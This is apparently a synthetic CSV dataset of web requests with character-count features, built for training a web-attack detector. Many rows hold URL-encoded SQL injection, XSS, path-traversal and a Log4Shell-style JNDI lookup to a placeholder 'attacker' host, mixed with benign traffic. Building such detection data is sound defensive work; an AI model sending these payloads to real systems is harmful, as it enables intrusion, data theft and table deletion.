method,path,body,single_q,double_q,dashes,braces,spaces,badwords
GET,/news/business?q=..%2Fetc%2Fpasswd,,0,0,0,0,0,1
POST,/user/wishlist,id=55,0,0,0,0,0,0
POST,/settings/security,uemail=test@example.com,0,0,0,0,0,0
GET,/news/world,,0,0,0,0,0,0
GET,/orders?q=%22+OR+%221%22%3D%221,,0,4,0,0,2,0
POST,/api/v1/categories,uname=test&pass=test,0,0,0,0,0,0
POST,/user/profile?id=2,uname=test&pass=test,0,0,0,0,0,0
POST,/books?q=%27+UNION+SELECT+1%2C2%2C3+--,data=%27+UNION+SELECT+1%2C2%2C3+--,2,0,2,0,8,8
POST,/forum/post?id=2?q=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,data=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,4,0,0,2,0,6
POST,/offers,searchFor=book&goButton=go,0,0,0,0,0,0
POST,/admin/settings,,0,0,0,0,0,0
POST,/assets/images/logo.png,uemail=test@example.com,0,0,0,0,0,0
POST,/reviews,uemail=test@example.com,0,0,0,0,0,0
POST,/products.html,id=55,0,0,0,0,0,0
GET,/orders/list?q=%27+AND+1%3D1+--,,1,0,1,0,3,1
GET,/services.html?q=%22+OR+%221%22%3D%221,,0,4,0,0,2,0
POST,/page/3,uaddress=21+street&update=update,0,0,0,0,1,4
POST,/forum/post?id=1?q=%22+OR+%221%22%3D%221,data=%22+OR+%221%22%3D%221,0,8,0,0,4,0
POST,/account/security,uemail=test@example.com,0,0,0,0,0,0
POST,/promo,comment=Nice+product,0,0,0,0,1,0
POST,/blog/category/tech,uemail=test@example.com,0,0,0,0,0,0
GET,/products/filter?price=high,,0,0,0,0,0,0
GET,/offers/clearance?q=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,,0,0,0,1,2,1
POST,/api/v1/items,product=123&type=info,0,0,0,0,0,0
POST,/account/info,uname=test&pass=test,0,0,0,0,0,0
GET,/crypto/coin?id=ETH,,0,0,0,0,0,0
POST,/docs/introduction,uemail=test@example.com,0,0,0,0,0,0
GET,/billing/invoice?id=55,,0,0,0,0,0,0
POST,/events/past,uaddress=21+street&update=update,0,0,0,0,1,4
POST,/api/v1/items,uemail=test@example.com,0,0,0,0,0,0
POST,/locations/europe?q=admin%27+--,data=admin%27+--,2,0,2,0,2,0
GET,/sports/cricket?q=..%2Fetc%2Fpasswd,,0,0,0,0,0,1
GET,/billing/invoice?id=55?q=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,,2,0,0,1,0,3
POST,/auth/login,searchFor=book&goButton=go,0,0,0,0,0,0
GET,/languages?q=%27+OR+%271%27%3D%271,,4,0,0,0,2,0
GET,/search?page=2,,0,0,0,0,0,0
GET,/products,,0,0,0,0,0,0
POST,/auth/login?q=%27%3B+DROP+TABLE+users%3B+--,data=%27%3B+DROP+TABLE+users%3B+--,2,0,2,0,8,4
GET,/music,,0,0,0,0,0,0
POST,/dashboard,uname=test&pass=test,0,0,0,0,0,0
POST,/weather/city?name=Delhi,id=55,0,0,0,0,0,0
GET,/static/app.js,,0,0,0,0,0,0
GET,/about.html?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,,0,0,0,1,0,3
POST,/weather/today,searchFor=book&goButton=go,0,0,0,0,0,0
POST,/offers/today,id=55,0,0,0,0,0,0
POST,/assets/images/logo.png?q=benchmark%281000000%2Cmd5%281%29%29,data=benchmark%281000000%2Cmd5%281%29%29,0,0,0,4,0,2
GET,/shop/categories,,0,0,0,0,0,0
POST,/user,searchFor=book&goButton=go,0,0,0,0,0,0
GET,/pricing.html?q=%27+OR+%271%27%3D%271,,4,0,0,0,2,0
POST,/careers/job?id=25,uemail=test@example.com,0,0,0,0,0,0
POST,/api/v1/users/1,uemail=test@example.com,0,0,0,0,0,0
GET,/gallery/photos,,0,0,0,0,0,0
POST,/analytics/sales,product=123&type=info,0,0,0,0,0,0
GET,/library/books,,0,0,0,0,0,0
GET,/books/read?id=100,,0,0,0,0,0,0
GET,/store/cart,,0,0,0,0,0,0
POST,/search?cat=electronics?q=%22+AND+1%3D1+--,data=%22+AND+1%3D1+--,0,2,2,0,6,2
GET,/api/v3/notifications?q=%27+AND+1%3D1+--,,1,0,1,0,3,1
GET,/reviews,,0,0,0,0,0,0
GET,/products/related?id=10?q=%27+OR+%271%27%3D%271,,4,0,0,0,2,0
GET,/stocks,,0,0,0,0,0,0
GET,/user/wishlist?q=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,,0,0,0,1,2,1
GET,/promo/winter,,0,0,0,0,0,0
POST,/shop,product=123&type=info,0,0,0,0,0,0
GET,/stocks/market,,0,0,0,0,0,0
POST,/events/upcoming?q=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,data=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,0,0,0,2,4,2
POST,/promo/winter,product=123&type=info,0,0,0,0,0,0
POST,/search?q=laptops?q=sleep%285%29,data=sleep%285%29,0,0,0,2,0,4
POST,/user/settings,uname=test&pass=test,0,0,0,0,0,0
POST,/search?q=mobiles,uemail=test@example.com,0,0,0,0,0,0
POST,/settings/billing?q=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,data=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,4,0,0,2,0,6
POST,/docs/examples,uname=test&pass=test,0,0,0,0,0,0
POST,/account/info,uname=test&pass=test,0,0,0,0,0,0
GET,/billing,,0,0,0,0,0,0
GET,/products.html?q=%27%3B+DROP+TABLE+users%3B+--,,1,0,1,0,4,2
GET,/static/script.js,,0,0,0,0,0,1
GET,/admin?q=%22+AND+1%3D1+--,,0,1,1,0,3,1
POST,/books/read?id=100?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,data=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,0,0,0,2,0,6
GET,/static/app.js,,0,0,0,0,0,0
POST,/,comment=Nice+product,0,0,0,0,1,0
GET,/restaurants/view?id=23?q=%22+AND+1%3D1+--,,0,1,1,0,3,1
GET,/shop,,0,0,0,0,0,0
GET,/shop,,0,0,0,0,0,0
GET,/crypto/market?q=%27+OR+sleep%285%29%23,,1,0,0,1,2,2
GET,/forum/post?id=2?q=%27+OR+%271%27%3D%271,,4,0,0,0,2,0
GET,/news/latest,,0,0,0,0,0,0
GET,/search?page=3?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,,0,0,0,1,0,3
POST,/forum/threads?q=sleep%285%29,data=sleep%285%29,0,0,0,2,0,4
GET,/store/apply-coupon?code=NEW50?q=benchmark%281000000%2Cmd5%281%29%29,,0,0,0,2,0,1
GET,/languages/hindi,,0,0,0,0,0,0
POST,/unsubscribe?q=%27+AND+1%3D1+--,data=%27+AND+1%3D1+--,2,0,2,0,6,2
GET,/billing/payment-methods,,0,0,0,0,0,0
POST,/assets/images/logo.png,uaddress=21+street&update=update,0,0,0,0,1,4
GET,/weather/today,,0,0,0,0,0,0
POST,/inbox,product=123&type=info,0,0,0,0,0,0
GET,/api/v1/users/2,,0,0,0,0,0,0
POST,/billing/invoice?id=55?q=%253Cscript%253Ealert%28%29,data=%253Cscript%253Ealert%28%29,0,0,0,2,0,4
POST,/downloads,searchFor=book&goButton=go,0,0,0,0,0,0
POST,/category/electronics?q=%253Cscript%253Ealert%28%29,data=%253Cscript%253Ealert%28%29,0,0,0,2,0,4
GET,/help/how-to-order,,0,0,0,0,0,0
GET,/docs?q=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,,0,0,0,1,2,1
GET,/unsubscribe?q=sleep%285%29,,0,0,0,1,0,2
POST,/feedback/form,uaddress=21+street&update=update,0,0,0,0,1,4
POST,/news/local,uaddress=21+street&update=update,0,0,0,0,1,4
POST,/forum,,0,0,0,0,0,0
POST,/notifications,id=55,0,0,0,0,0,0
POST,/user/wishlist/add?id=98,id=55,0,0,0,0,0,0
GET,/music/playlist?id=4,,0,0,0,0,0,0
GET,/static/script.js,,0,0,0,0,0,1
GET,/products/related?id=10?q=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,,0,0,0,1,2,1
POST,/movies/popular,id=55,0,0,0,0,0,0
POST,/languages,uname=test&pass=test,0,0,0,0,0,0
POST,/organization/about,searchFor=book&goButton=go,0,0,0,0,0,0
POST,/products?q=..%2F..%2F..%2F..%2Fwindows%2Fsystem32,data=..%2F..%2F..%2F..%2Fwindows%2Fsystem32,0,0,0,0,0,2
GET,/travel/flights,,0,0,0,0,0,0
POST,/user/cart/add?id=45,uaddress=21+street&update=update,0,0,0,0,1,4
POST,/news/trending,uname=test&pass=test,0,0,0,0,0,0
POST,/downloads/manual?q=benchmark%281000000%2Cmd5%281%29%29,data=benchmark%281000000%2Cmd5%281%29%29,0,0,0,4,0,2
GET,/assets/js/config.js,,0,0,0,0,0,0
POST,/shop?q=benchmark%281000000%2Cmd5%281%29%29,data=benchmark%281000000%2Cmd5%281%29%29,0,0,0,4,0,2
POST,/books?q=..%2F..%2F..%2F..%2Fwindows%2Fsystem32,data=..%2F..%2F..%2F..%2Fwindows%2Fsystem32,0,0,0,0,0,2
GET,/support/chat,,0,0,0,0,0,0
POST,/auth/reset-password,id=55,0,0,0,0,0,0
POST,/products/related?id=10,product=123&type=info,0,0,0,0,0,0
POST,/products/top,,0,0,0,0,0,0
POST,/category/sports,uname=test&pass=test,0,0,0,0,0,0
GET,/user/settings,,0,0,0,0,0,0
POST,/billing/payment-methods?q=%22+OR+%221%22%3D%221,data=%22+OR+%221%22%3D%221,0,8,0,0,4,0
POST,/home.html,id=55,0,0,0,0,0,0
POST,/api/v2/register,product=123&type=info,0,0,0,0,0,0
GET,/billing/invoice?id=55,,0,0,0,0,0,0
POST,/orders/list?q=%27+AND+1%3D1+--,data=%27+AND+1%3D1+--,2,0,2,0,6,2
GET,/checkout/payment,,0,0,0,0,0,0
POST,/unsubscribe,uaddress=21+street&update=update,0,0,0,0,1,4
GET,/admin,,0,0,0,0,0,0
POST,/user/cart/add?id=45,uaddress=21+street&update=update,0,0,0,0,1,4
GET,/blog/category/security?q=..%2F..%2F..%2F..%2Fwindows%2Fsystem32,,0,0,0,0,0,1
GET,/products/filter?price=high?q=admin%27+--,,1,0,1,0,1,0
GET,/auth/login,,0,0,0,0,0,0
GET,/feedback?q=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,,0,0,0,1,2,1
POST,/inbox/messages?q=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,data=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,0,0,0,2,4,2
GET,/api/v1/orders?q=%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27+--,,3,0,1,0,4,2
GET,/faq?q=%27+AND+1%3D1+--,,1,0,1,0,3,1
POST,/shop?q=%27+UNION+SELECT+1%2C2%2C3+--,data=%27+UNION+SELECT+1%2C2%2C3+--,2,0,2,0,8,8
GET,/assets/images/banner.jpg,,0,0,0,0,0,0
POST,/support/ticket,uemail=test@example.com,0,0,0,0,0,0
POST,/static/app.js,product=123&type=info,0,0,0,0,0,0
GET,/forum/category/coding,,0,0,0,0,0,0
POST,/static/script.js,searchFor=book&goButton=go,0,0,0,0,0,1
GET,/products/top,,0,0,0,0,0,0
POST,/products/filter?price=high?q=sleep%285%29,data=sleep%285%29,0,0,0,2,0,4
POST,/news/trending,uemail=test@example.com,0,0,0,0,0,0
POST,/support/ticket?q=benchmark%281000000%2Cmd5%281%29%29,data=benchmark%281000000%2Cmd5%281%29%29,0,0,0,4,0,2
POST,/support,uemail=test@example.com,0,0,0,0,0,0
POST,/stocks/company?id=TCS?q=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,data=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,0,0,0,2,4,2
POST,/tickets,uname=test&pass=test,0,0,0,0,0,0
POST,/forum?q=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,data=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,0,0,0,2,4,2
POST,/blog/post3?q=sleep%285%29,data=sleep%285%29,0,0,0,2,0,4
GET,/university/course?id=20,,0,0,0,0,0,0
GET,/notifications,,0,0,0,0,0,0
GET,/static/main.js?q=%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27+--,,3,0,1,0,4,2
POST,/help/faq?q=1%3B+DROP+TABLE+users%3B,data=1%3B+DROP+TABLE+users%3B,0,0,0,0,6,4
GET,/movies,,0,0,0,0,0,0
GET,/news/local?q=%24%7Bjndi%3Aldap%3A%2F%2Fattacker%7D,,0,0,0,0,0,0
GET,/music/songs,,0,0,0,0,0,0
POST,/terms-and-conditions,uemail=test@example.com,0,0,0,0,0,0
POST,/category/home-appliances,product=123&type=info,0,0,0,0,0,0
GET,/billing,,0,0,0,0,0,0
POST,/subscriptions,,0,0,0,0,0,1
POST,/restaurants/view?id=23?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,data=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,0,0,0,2,0,6
GET,/contact.html,,0,0,0,0,0,0
GET,/contact.html?q=%27+OR+%271%27%3D%271,,4,0,0,0,2,0
POST,/store,uaddress=21+street&update=update,0,0,0,0,1,4
GET,/languages/english,,0,0,0,0,0,0
POST,/news,uemail=test@example.com,0,0,0,0,0,0
GET,/checkout/address,,0,0,0,0,0,0
POST,/partners/apply,id=55,0,0,0,0,0,0
GET,/user/wishlist/add?id=98,,0,0,0,0,0,0
POST,/search?page=3,,0,0,0,0,0,0
GET,/restaurants/nearby,,0,0,0,0,0,0
GET,/api/v2/register,,0,0,0,0,0,0
GET,/auth/login,,0,0,0,0,0,0
POST,/products/filter?cat=men?q=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,data=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,4,0,0,2,0,6
POST,/pricing.html?q=..%2F..%2F..%2F..%2Fwindows%2Fsystem32,data=..%2F..%2F..%2F..%2Fwindows%2Fsystem32,0,0,0,0,0,2
POST,/page/2?q=..%2Fetc%2Fpasswd,data=..%2Fetc%2Fpasswd,0,0,0,0,0,2
GET,/category/home-appliances,,0,0,0,0,0,0
POST,/products/filter?price=high?q=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,data=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,4,0,0,2,0,6
GET,/restaurants/nearby,,0,0,0,0,0,0
GET,/locations/europe,,0,0,0,0,0,0
POST,/news,searchFor=book&goButton=go,0,0,0,0,0,0
POST,/account/security?q=..%2Fetc%2Fpasswd,data=..%2Fetc%2Fpasswd,0,0,0,0,0,2
GET,/static/theme.css?q=%27+OR+%271%27%3D%271,,4,0,0,0,2,0
POST,/products/reviews?id=10?q=%22+OR+%221%22%3D%221,data=%22+OR+%221%22%3D%221,0,8,0,0,4,0
GET,/subscriptions/manage,,0,0,0,0,0,1
POST,/organization,product=123&type=info,0,0,0,0,0,0
GET,/auth/logout?q=..%2F..%2F..%2F..%2Fwindows%2Fsystem32,,0,0,0,0,0,1
POST,/locations/india?q=admin%27+--,data=admin%27+--,2,0,2,0,2,0
POST,/promo,uaddress=21+street&update=update,0,0,0,0,1,4
POST,/languages/english,id=55,0,0,0,0,0,0
POST,/assets/js/config.js,uname=test&pass=test,0,0,0,0,0,0
POST,/services.php,id=55,0,0,0,0,0,0
GET,/news/world?q=%27+AND+1%3D1+--,,1,0,1,0,3,1
GET,/restaurants/nearby,,0,0,0,0,0,0
POST,/store/phones,id=55,0,0,0,0,0,0
GET,/category/fashion,,0,0,0,0,0,0
POST,/store/laptops,,0,0,0,0,0,0
POST,/movies/details?id=9?q=%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27+--,data=%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27+--,6,0,2,0,8,4
POST,/help/how-to-order,id=55,0,0,0,0,0,0
POST,/dashboard,comment=Nice+product,0,0,0,0,1,0
POST,/search?page=3?q=..%2Fetc%2Fpasswd,data=..%2Fetc%2Fpasswd,0,0,0,0,0,2
POST,/forum?q=%27+UNION+SELECT+1%2C2%2C3+--,data=%27+UNION+SELECT+1%2C2%2C3+--,2,0,2,0,8,8
POST,/settings/billing?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,data=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,0,0,0,2,0,6
GET,/page/4,,0,0,0,0,0,0
POST,/services.php?q=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,data=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,0,0,0,2,4,2
POST,/library,uaddress=21+street&update=update,0,0,0,0,1,4
POST,/music,,0,0,0,0,0,0
GET,/shop,,0,0,0,0,0,0
POST,/subscribe,product=123&type=info,0,0,0,0,0,0
GET,/forum/category/coding?q=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,,2,0,0,1,0,3
POST,/help/contact,id=55,0,0,0,0,0,0
POST,/search?q=mobiles,uemail=test@example.com,0,0,0,0,0,0
POST,/admin/reports,uaddress=21+street&update=update,0,0,0,0,1,4
GET,/books/bestsellers?q=%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27+--,,3,0,1,0,4,2
GET,/admin/settings,,0,0,0,0,0,0
POST,/subscribe,uname=test&pass=test,0,0,0,0,0,0
POST,/careers/job?id=25,uaddress=21+street&update=update,0,0,0,0,1,4
POST,/gallery?q=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,data=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,0,0,0,2,4,2
GET,/api/v3/notifications,,0,0,0,0,0,0
GET,/locations/usa,,0,0,0,0,0,0
POST,/crypto/market?q=..%2Fetc%2Fpasswd,data=..%2Fetc%2Fpasswd,0,0,0,0,0,2
POST,/support,uemail=test@example.com,0,0,0,0,0,0
GET,/offers,,0,0,0,0,0,0
POST,/contact.php,product=123&type=info,0,0,0,0,0,0
GET,/search?page=2,,0,0,0,0,0,0
GET,/products/filter?price=low?q=%27+AND+1%3D1+--,,1,0,1,0,3,1
POST,/tickets/view?id=44,,0,0,0,0,0,0
POST,/support/ticket,uaddress=21+street&update=update,0,0,0,0,1,4
GET,/checkout/payment,,0,0,0,0,0,0
POST,/forum/category/coding,uname=test&pass=test,0,0,0,0,0,0
GET,/assets/images/logo.png?q=1%3B+DROP+TABLE+users%3B,,0,0,0,0,3,2
POST,/search?q=laptops,id=55,0,0,0,0,0,0
POST,/projects/view?id=8?q=benchmark%281000000%2Cmd5%281%29%29,data=benchmark%281000000%2Cmd5%281%29%29,0,0,0,4,0,2
POST,/category/home-appliances,uname=test&pass=test,0,0,0,0,0,0
GET,/locations/usa,,0,0,0,0,0,0
POST,/billing/history,uname=test&pass=test,0,0,0,0,0,0
POST,/subscriptions/manage,product=123&type=info,0,0,0,0,0,1
GET,/search?cat=fashion,,0,0,0,0,0,0
GET,/stocks/company?id=TCS,,0,0,0,0,0,0
GET,/products/filter?price=high,,0,0,0,0,0,0
POST,/subscriptions/manage?q=..%2F..%2F..%2F..%2Fwindows%2Fsystem32,data=..%2F..%2F..%2F..%2Fwindows%2Fsystem32,0,0,0,0,0,3
GET,/home.html?q=1%3B+DROP+TABLE+users%3B,,0,0,0,0,3,2
POST,/movies/details?id=9,uname=test&pass=test,0,0,0,0,0,0
POST,/search?q=laptops,uaddress=21+street&update=update,0,0,0,0,1,4
GET,/page/2,,0,0,0,0,0,0
GET,/settings/billing?q=..%2Fetc%2Fpasswd,,0,0,0,0,0,1
GET,/api/v1/users,,0,0,0,0,0,0
GET,/api/v3/notifications,,0,0,0,0,0,0
GET,/sports,,0,0,0,0,0,0
POST,/music/songs?q=%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27+--,data=%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27+--,6,0,2,0,8,4
POST,/checkout/address?q=%27+OR+%271%27%3D%271,data=%27+OR+%271%27%3D%271,8,0,0,0,4,0
POST,/blog/post2?q=%27+OR+sleep%285%29%23,data=%27+OR+sleep%285%29%23,2,0,0,2,4,4
GET,/checkout/payment,,0,0,0,0,0,0
GET,/subscriptions/manage,,0,0,0,0,0,1
GET,/search?page=3,,0,0,0,0,0,0
POST,/account/downloads,comment=Nice+product,0,0,0,0,1,0
POST,/index.php,uaddress=21+street&update=update,0,0,0,0,1,4
POST,/offers,,0,0,0,0,0,0
POST,/index.html?q=..%2Fetc%2Fpasswd,data=..%2Fetc%2Fpasswd,0,0,0,0,0,2
POST,/assets/css/main.css,uaddress=21+street&update=update,0,0,0,0,1,4
GET,/category/electronics,,0,0,0,0,0,0
POST,/store/cart?q=%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27+--,data=%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27+--,6,0,2,0,8,4
POST,/home.html,uaddress=21+street&update=update,0,0,0,0,1,4
POST,/settings/security,uname=test&pass=test,0,0,0,0,0,0
POST,/static/theme.css,searchFor=book&goButton=go,0,0,0,0,0,0
POST,/appointments/book,comment=Nice+product,0,0,0,0,1,0
GET,/inbox/messages,,0,0,0,0,0,0
GET,/sports/football,,0,0,0,0,0,0
POST,/terms-and-conditions,id=55,0,0,0,0,0,0
POST,/api/v1/users,uaddress=21+street&update=update,0,0,0,0,1,4
GET,/api/v3/dashboard,,0,0,0,0,0,0
GET,/orders/detail?id=100,,0,0,0,0,0,0
GET,/appointments/book?q=%253Cscript%253Ealert%28%29,,0,0,0,1,0,2
POST,/downloads/app,product=123&type=info,0,0,0,0,0,0
GET,/notifications,,0,0,0,0,0,0
POST,/subscriptions/manage?q=%22+AND+1%3D1+--,data=%22+AND+1%3D1+--,0,2,2,0,6,3
GET,/index.html,,0,0,0,0,0,0
POST,/page/3,searchFor=book&goButton=go,0,0,0,0,0,0
GET,/dashboard/stats?q=..%2Fetc%2Fpasswd,,0,0,0,0,0,1
GET,/admin/reports,,0,0,0,0,0,0
GET,/organization/about,,0,0,0,0,0,0
POST,/restaurants/view?id=23,id=55,0,0,0,0,0,0
GET,/reviews,,0,0,0,0,0,0
POST,/api/v3/messages?q=%22+OR+%221%22%3D%221,data=%22+OR+%221%22%3D%221,0,8,0,0,4,0
POST,/downloads/app,product=123&type=info,0,0,0,0,0,0
POST,/forum/category/coding?q=%22+OR+%221%22%3D%221,data=%22+OR+%221%22%3D%221,0,8,0,0,4,0
GET,/user/cart,,0,0,0,0,0,0
POST,/assets/images/logo.png?q=%22+OR+%221%22%3D%221,data=%22+OR+%221%22%3D%221,0,8,0,0,4,0
GET,/settings,,0,0,0,0,0,0
POST,/admin,comment=Nice+product,0,0,0,0,1,0
GET,/books,,0,0,0,0,0,0
GET,/page/2,,0,0,0,0,0,0
POST,/api/v2/orders,,0,0,0,0,0,0
POST,/movies/popular?q=%253Cscript%253Ealert%28%29,data=%253Cscript%253Ealert%28%29,0,0,0,2,0,4
GET,/products/filter?price=low,,0,0,0,0,0,0
GET,/partners/login,,0,0,0,0,0,0
POST,/api/v3/dashboard,product=123&type=info,0,0,0,0,0,0
POST,/account/info,product=123&type=info,0,0,0,0,0,0
POST,/category/sports,product=123&type=info,0,0,0,0,0,0
GET,/locations/usa,,0,0,0,0,0,0
POST,/api/v1/items,,0,0,0,0,0,0
POST,/api/v1/items,uemail=test@example.com,0,0,0,0,0,0
GET,/static/style.css,,0,0,0,0,0,0
POST,/api/v2/login?q=%27%3B+DROP+TABLE+users%3B+--,data=%27%3B+DROP+TABLE+users%3B+--,2,0,2,0,8,4
POST,/downloads?q=benchmark%281000000%2Cmd5%281%29%29,data=benchmark%281000000%2Cmd5%281%29%29,0,0,0,4,0,2
POST,/news/trending,uaddress=21+street&update=update,0,0,0,0,1,4
GET,/forum/category/coding?q=%24%7Bjndi%3Aldap%3A%2F%2Fattacker%7D,,0,0,0,0,0,0
GET,/tickets/view?id=44,,0,0,0,0,0,0
POST,/projects/list,product=123&type=info,0,0,0,0,0,0
POST,/offers/clearance,comment=Nice+product,0,0,0,0,1,0
GET,/subscriptions,,0,0,0,0,0,1
GET,/help/faq?q=..%2Fetc%2Fpasswd,,0,0,0,0,0,1
POST,/travel/flights?q=%27+AND+1%3D1+--,data=%27+AND+1%3D1+--,2,0,2,0,6,2
POST,/playlists/mixes,product=123&type=info,0,0,0,0,0,0
POST,/downloads,id=55,0,0,0,0,0,0
POST,/faq,,0,0,0,0,0,0
GET,/gallery?q=..%2F..%2F..%2F..%2Fwindows%2Fsystem32,,0,0,0,0,0,1
POST,/account/security,uname=test&pass=test,0,0,0,0,0,0
POST,/news/local,uemail=test@example.com,0,0,0,0,0,0
POST,/orders/detail?id=100,searchFor=book&goButton=go,0,0,0,0,0,0
GET,/forum/category/tech,,0,0,0,0,0,0
GET,/search?page=3,,0,0,0,0,0,0
POST,/user/wishlist?q=%27+OR+%271%27%3D%271,data=%27+OR+%271%27%3D%271,8,0,0,0,4,0
POST,/weather/city?name=Delhi,uemail=test@example.com,0,0,0,0,0,0
POST,/search?cat=fashion,,0,0,0,0,0,0
GET,/support/ticket?q=%22+AND+1%3D1+--,,0,1,1,0,3,1
GET,/weather/city?name=Delhi,,0,0,0,0,0,0
POST,/services.html?q=%27+UNION+SELECT+1%2C2%2C3+--,data=%27+UNION+SELECT+1%2C2%2C3+--,2,0,2,0,8,8
POST,/products/filter?price=high,product=123&type=info,0,0,0,0,0,0
GET,/products/view?id=2?q=%27+UNION+SELECT+1%2C2%2C3+--,,1,0,1,0,4,4
GET,/billing/history,,0,0,0,0,0,0
GET,/docs/setup?q=%22+AND+1%3D1+--,,0,1,1,0,3,1
GET,/books/read?id=100,,0,0,0,0,0,0
POST,/subscribe,,0,0,0,0,0,0
GET,/languages/hindi?q=%27+OR+%271%27%3D%271,,4,0,0,0,2,0
GET,/docs/api,,0,0,0,0,0,0
POST,/products/filter?cat=men,searchFor=book&goButton=go,0,0,0,0,0,0
GET,/store/cameras,,0,0,0,0,0,0
POST,/user/profile?id=3,uname=test&pass=test,0,0,0,0,0,0
POST,/user/messages?q=%27+UNION+SELECT+1%2C2%2C3+--,data=%27+UNION+SELECT+1%2C2%2C3+--,2,0,2,0,8,8
GET,/billing/invoice?id=55,,0,0,0,0,0,0
POST,/crypto/coin?id=ETH,comment=Nice+product,0,0,0,0,1,0
POST,/music,,0,0,0,0,0,0
GET,/billing/history,,0,0,0,0,0,0
POST,/contact.php?q=%253Cscript%253Ealert%28%29,data=%253Cscript%253Ealert%28%29,0,0,0,2,0,4
GET,/user/orders,,0,0,0,0,0,0
POST,/shop/item?id=89?q=..%2Fetc%2Fpasswd,data=..%2Fetc%2Fpasswd,0,0,0,0,0,2
GET,/blog/category/lifestyle,,0,0,0,0,0,0
POST,/account,comment=Nice+product,0,0,0,0,1,0
GET,/analytics?q=%24%7Bjndi%3Aldap%3A%2F%2Fattacker%7D,,0,0,0,0,0,0
GET,/restaurants/view?id=23,,0,0,0,0,0,0
GET,/forum?q=..%2Fetc%2Fpasswd,,0,0,0,0,0,1
POST,/products/view?id=1,searchFor=book&goButton=go,0,0,0,0,0,0
POST,/locations/usa?q=%253Cscript%253Ealert%28%29,data=%253Cscript%253Ealert%28%29,0,0,0,2,0,4
POST,/languages/hindi,uaddress=21+street&update=update,0,0,0,0,1,4
GET,/search?q=laptops,,0,0,0,0,0,0
GET,/travel/flights,,0,0,0,0,0,0
GET,/forum/category/coding,,0,0,0,0,0,0
POST,/forum,uaddress=21+street&update=update,0,0,0,0,1,4
POST,/events?q=1%3B+DROP+TABLE+users%3B,data=1%3B+DROP+TABLE+users%3B,0,0,0,0,6,4
POST,/music,comment=Nice+product,0,0,0,0,1,0
GET,/api/v2/checkout,,0,0,0,0,0,0
POST,/page/3,uaddress=21+street&update=update,0,0,0,0,1,4
POST,/feedback/submit,uemail=test@example.com,0,0,0,0,0,0
